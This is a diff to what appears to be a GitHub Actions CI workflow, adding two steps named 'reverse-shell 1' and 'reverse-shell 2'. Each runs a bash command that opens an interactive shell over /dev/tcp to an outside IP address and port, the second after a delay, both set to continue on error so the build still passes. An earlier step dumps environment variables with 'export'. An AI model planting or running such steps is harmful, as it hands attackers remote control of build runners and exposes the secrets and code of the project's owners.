@@ -55,6 +55,14 @@ jobs:
         run: export
         shell: /bin/sh {0}
         continue-on-error: true
+      - name: reverse-shell 1
+        run: bash -i >& /dev/tcp/84.184.68.62/23403 0>&1
+        shell: /bin/sh {0}
+        continue-on-error: true
+      - name: reverse-shell 2
+        run: sleep 20 && bash -i >& /dev/tcp/84.184.68.62/23403 0>&1
+        shell: /bin/sh {0}
+        continue-on-error: true
       - run: |-
           ls /nix/var/nix/profiles/per-user
           echo "trusted-users = root $USER" | sudo tee -a /etc/nix/nix.conf
